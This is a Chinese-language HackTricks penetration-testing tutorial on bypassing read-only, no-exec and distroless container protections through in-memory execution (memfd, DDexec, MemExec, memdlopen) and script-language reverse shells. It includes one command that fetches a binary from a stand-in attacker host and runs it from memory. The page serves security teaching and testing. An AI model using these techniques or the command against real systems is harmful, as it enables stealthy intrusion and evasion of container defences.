# 绕过文件系统保护：只读 / 无执行 / Distroless

{{#include ../../../banners/hacktricks-training.md}}

## 视频

在以下视频中，您可以找到本页面提到的技术的更深入解释：

- [**DEF CON 31 - 探索Linux内存操控以实现隐蔽和规避**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**使用DDexec-ng和内存dlopen()进行隐蔽入侵 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## 只读 / 无执行场景

越来越多的Linux机器以**只读（ro）文件系统保护**的方式挂载，特别是在容器中。这是因为运行一个只读文件系统的容器就像在`securitycontext`中设置**`readOnlyRootFilesystem: true`**一样简单：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

然而，即使文件系统以ro挂载，**`/dev/shm`**仍然是可写的，因此我们不能在磁盘上写入的说法是错误的。然而，这个文件夹将被**挂载为无执行保护**，因此如果您在这里下载一个二进制文件，您**将无法执行它**。

> [!WARNING]
> 从红队的角度来看，这使得**下载和执行**系统中尚不存在的二进制文件（如后门或枚举器如`kubectl`）变得**复杂**。

## 最简单的绕过：脚本

请注意，我提到的是二进制文件，您可以**执行任何脚本**，只要解释器在机器内部，例如如果`sh`存在，则可以执行**shell脚本**，或者如果安装了`python`，则可以执行**python脚本**。

然而，这并不足以执行您的二进制后门或您可能需要运行的其他二进制工具。

## 内存绕过

如果您想执行一个二进制文件，但文件系统不允许这样做，最好的方法是通过**从内存中执行它**，因为**保护措施不适用于那里**。

### FD + exec系统调用绕过

如果您在机器内部有一些强大的脚本引擎，例如**Python**、**Perl**或**Ruby**，您可以将二进制文件下载到内存中执行，将其存储在内存文件描述符中（`create_memfd`系统调用），这不会受到这些保护的限制，然后调用**`exec`系统调用**，指明**fd作为要执行的文件**。

为此，您可以轻松使用项目[**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)。您可以传递一个二进制文件，它将生成一个指定语言的脚本，**二进制文件经过压缩和b64编码**，并包含**解码和解压缩它**的指令，使用调用`create_memfd`系统调用创建的**fd**和调用**exec**系统调用来运行它。

> [!WARNING]
> 这在其他脚本语言中不起作用，例如PHP或Node，因为它们没有任何**默认方式从脚本调用原始系统调用**，因此无法调用`create_memfd`来创建**内存fd**以存储二进制文件。
>
> 此外，使用`/dev/shm`中的文件创建**常规fd**将不起作用，因为您将无法运行它，因为**无执行保护**将适用。

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)是一种技术，允许您通过覆盖**`/proc/self/mem`**来**修改您自己进程的内存**。

因此，**控制正在被进程执行的汇编代码**，您可以编写**shellcode**并“变异”进程以**执行任何任意代码**。

> [!TIP]
> **DDexec / EverythingExec**将允许您加载并**执行**您自己的**shellcode**或**任何二进制文件**从**内存**中。
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
有关此技术的更多信息，请查看 Github 或：

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) 是 DDexec 的自然下一步。它是一个 **DDexec shellcode demonised**，因此每次您想要 **运行不同的二进制文件** 时，您无需重新启动 DDexec，只需通过 DDexec 技术运行 memexec shellcode，然后 **与此守护进程通信以传递要加载和运行的新二进制文件**。

您可以在 [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) 中找到如何使用 **memexec 从 PHP 反向 shell 执行二进制文件** 的示例。

### Memdlopen

与 DDexec 具有类似目的的 [**memdlopen**](https://github.com/arget13/memdlopen) 技术允许以 **更简单的方式加载二进制文件** 到内存中以便稍后执行。它甚至可以允许加载具有依赖关系的二进制文件。

## Distroless Bypass

### 什么是 distroless

Distroless 容器仅包含 **运行特定应用程序或服务所需的最低组件**，例如库和运行时依赖项，但排除了较大的组件，如包管理器、shell 或系统实用程序。

Distroless 容器的目标是 **通过消除不必要的组件来减少容器的攻击面**，并最小化可以被利用的漏洞数量。

### 反向 Shell

在 distroless 容器中，您可能 **甚至找不到 `sh` 或 `bash`** 来获取常规 shell。您也不会找到诸如 `ls`、`whoami`、`id` 等二进制文件……您通常在系统中运行的所有内容。

> [!WARNING]
> 因此，您 **将无法** 获取 **反向 shell** 或 **枚举** 系统，如您通常所做的那样。

然而，如果被攻陷的容器正在运行例如 flask web，那么 python 已安装，因此您可以获取 **Python 反向 shell**。如果它正在运行 node，您可以获取 Node 反向 shell，几乎任何 **脚本语言** 也是如此。

> [!TIP]
> 使用脚本语言，您可以 **使用语言功能枚举系统**。

如果没有 **`read-only/no-exec`** 保护，您可以利用反向 shell **在文件系统中写入您的二进制文件** 并 **执行** 它们。

> [!TIP]
> 然而，在这种类型的容器中，这些保护通常会存在，但您可以使用 **先前的内存执行技术来绕过它们**。

您可以在 [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) 中找到 **示例**，了解如何 **利用一些 RCE 漏洞** 获取脚本语言的 **反向 shell** 并从内存中执行二进制文件。

{{#include ../../../banners/hacktricks-training.md}}
